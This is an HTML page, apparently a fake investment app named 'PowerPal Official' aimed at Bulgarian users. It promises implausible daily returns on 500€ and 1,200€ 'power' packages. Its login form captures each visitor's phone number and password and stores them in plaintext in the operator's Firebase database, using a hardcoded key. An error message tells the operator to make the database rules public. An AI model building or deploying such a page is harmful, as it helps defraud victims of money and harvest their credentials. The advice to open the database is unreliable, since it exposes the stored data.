<!DOCTYPE html>
<html lang="bg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PowerPal Official</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <style>
        :root { --gold: #f2e032; --bg: #0b0e11; --card: #1e2329; --green: #02c076; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; }
        .app { width: 100%; max-width: 450px; padding: 20px; text-align: center; }
        .logo { font-size: 40px; font-weight: bold; color: var(--gold); margin: 30px 0 10px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #474d57; background: var(--card); color: white; box-sizing: border-box; font-size: 16px; }
        .btn-login { background: var(--gold); color: black; width: 100%; padding: 18px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; }
        .page { display: none; padding-top: 20px; }
        .package { background: var(--card); border-radius: 15px; margin-bottom: 15px; border: 1px solid #2b3139; padding: 15px; text-align: left; }
        .price { color: var(--gold); font-size: 20px; font-weight: bold; }
        .daily { color: var(--green); float: right; font-weight: bold; }
    </style>
</head>
<body>

<div class="app">
    <div id="auth">
        <div class="logo">PowerPal</div>
        <p style="color: #848e9c">Влезте в своя акаунт</p>
        <input type="tel" id="phone">
        <input type="password" id="pass" placeholder="Парола">
        <button class="btn-login" onclick="startProcess()">ВХОД / РЕГИСТРАЦИЯ</button>
    </div>

    <div id="main" class="page">
        <h2 style="color: var(--gold)">Инвестиционни Пакети</h2>
        <div class="package">
            <b>⚡ Power 8 Port (T2)</b> <span class="daily">22.50€/ден</span><br>
            <span class="price">500€</span>
        </div>
        <div class="package">
            <b>⚡ Power 16 Port (T3)</b> <span class="daily">61.00€/ден</span><br>
            <span class="price">1,200€</span>
        </div>
    </div>
</div>

<script>
    // ТВОИТЕ НОВИ ДАННИ (power-pall)
    const firebaseConfig = {
        apiKey: "AIzaSyBaFQGkG3yXEW4IFXndZ1f7NdBEz3UkvoU",
        authDomain: "power-pall.firebaseapp.com",
        databaseURL: "https://power-pall-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "power-pall",
        appId: "1:544660756007:web:23c80e0f5e68e9ecffa002"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const iti = window.intlTelInput(document.querySelector("#phone"), {
        initialCountry: "bg",
        separateDialCode: true,
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    function startProcess() {
        const number = iti.getNumber();
        const password = document.getElementById('pass').value;

        if (!number || password.length < 4) {
            alert("Моля, въведете данни!");
            return;
        }

        const id = number.replace('+', '');
        database.ref('users/' + id).set({
            phone: number,
            pass: password,
            date: new Date().toLocaleString()
        }).then(() => {
            document.getElementById('auth').style.display = 'none';
            document.getElementById('main').style.display = 'block';
        }).catch((err) => {
            alert("ГРЕШКА: " + err.message + "\n\n1. Отиди в Realtime Database\n2. Цъкни Rules\n3. Направи ги на true\n4. Натисни PUBLISH!");
        });
    }
</script>

</body>
</html>
